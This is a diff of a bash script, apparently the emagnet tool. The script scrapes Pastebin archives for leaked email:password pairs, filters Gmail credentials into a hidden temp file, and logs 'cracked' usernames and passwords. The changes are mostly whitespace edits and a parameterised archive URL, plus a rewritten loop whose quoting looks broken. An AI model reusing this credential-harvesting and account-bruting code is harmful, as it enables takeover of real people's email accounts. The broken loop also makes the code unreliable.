@@ -426,7 +426,6 @@ analyzer() {
 wait_time=$TIME
 temp_cnt=${wait_time}
 while [[ ${temp_cnt} -gt 0 ]]; do
-
     printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
 sleep 1
 ((temp_cnt--))
@@ -462,7 +461,6 @@ done
 exit
 }
 
-
 bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
 grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 
@@ -483,15 +481,13 @@ if [[ -n "$attack" ]]; then
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-passwords.txt
-   echo -e "================================================================\n\n" >>  $EMAGNETLOGS/cracked-passwords.txt
+   echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-passwords.txt
 fi
 done < /tmp/.emagnet-passwords.txt
 rm /tmp/.emagnet-passwords.txt
 else
      sleep 1
-
 fi
-
 }
 
 emagnetsyntax() {
@@ -506,7 +502,7 @@ if [[ $SYNTAX2DL = "" ]]; then
 else
 grep -q "$SYNTAX2DL" /tmp/.emagnet-syntaxes
 if [[ $? = "0" ]]; then
-elinks -dump https://pastebin.com/archive/bash |grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping' > /tmp/.emagnet-syntaxes-urls
+elinks -dump https://pastebin.com/archive/$SYNTAX2DL |grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping' > /tmp/.emagnet-syntaxes-urls
 clear;banner
 printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) $SYNTAX2DL files.."
 #SYNTAX2DL2="$(echo "SYNTAX2DL" |tr '[:upper:] [:lower:])"
@@ -532,9 +528,9 @@ if [[ $(ls $EMAGNETALL|wc -l) = "0" ]]; then
 else
    rm /tmp/.emagnet* &> /dev/null
    elinks -dump $PASTEBIN|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping' > /tmp/.emagnet1
-   ls $EMAGNETALL > /tmp/.emagnet2
-   grep -vf /tmp/.emagnet1 /tmp/.emagnet2 > /tmp/.emagnet
-   sed -i 's/^/https:\/\/pastebin.com\/archive\//g' /tmp/.emagnet
+while read line; do
+  grep -v '$line'|grep -i 'https' /tmp/.emagnet1 > /tmp/.emagnet
+done < $EMAGNETLOGS/pastebin-urls.txt
 fi
 else
 if [[ $(ls $EMAGNETALL|wc -l) = "0" ]]; then
@@ -542,9 +538,9 @@ if [[ $(ls $EMAGNETALL|wc -l) = "0" ]]; then
 else
    rm /tmp/.emagnet* &> /dev/null
    lynx -dump $PASTEBIN|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping\|\/raw\/pastebin\|contact'|cut -d/ -f5 > /tmp/.emagnet1
-   ls $EMAGNETALL > /tmp/.emagnet2
-   grep -vf /tmp/.emagnet1 /tmp/.emagnet2 > /tmp/.emagnet
-   sed -i 's/^/https:\/\/pastebin.com\/archive\//g' /tmp/.emagnet
+while read line; do
+  grep -v '$line'|grep -i 'https' /tmp/.emagnet1 > /tmp/.emagnet
+done < $EMAGNETLOGS/pastebin-urls.txt
 fi
 fi
 
@@ -828,7 +824,7 @@ else
 fi
 else
 	echo -n "Merging 'pastebin-urls.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
-fi 
+fi
 
 printf "\nAll data has been successfully merged into archive/logs\n\n"
 read -p "Do you want to wipe incoming directories (y/n): " cleanup
